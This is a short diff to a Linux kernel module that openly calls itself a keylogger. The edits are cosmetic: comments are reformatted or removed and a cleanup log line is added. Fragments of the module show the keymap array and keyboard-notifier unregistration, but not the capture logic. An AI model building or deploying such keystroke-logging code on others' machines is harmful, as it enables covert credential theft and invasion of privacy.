@@ -1,5 +1,6 @@
-/* Basics: https://www.gadgetweb.de/programming/39-how-to-building-your-own-kernel-space-keylogger.html */
-/* Keycodes: http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html */
+/*
+ * Keycodes: http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
+ */
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -9,14 +10,6 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tanner Hoelzel");
 MODULE_DESCRIPTION("A simple keylogging module");
-
-/*
- * struct notifier_block {
- *     int (*notifier_call)(struct notifier_block *, unsigned long, void *);
- *     struct notifier_block *next;
- *     int priority;
- * };
- */
 
 static const char* keymap[] =
 	{	"ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9",
@@ -73,6 +66,7 @@ static int __init keylogger_init(void)
 
 static void __exit keylogger_cleanup(void)
 {
+	printk(KERN_INFO "Cleaning up module\n");
 	unregister_keyboard_notifier(&nb);
 }
 
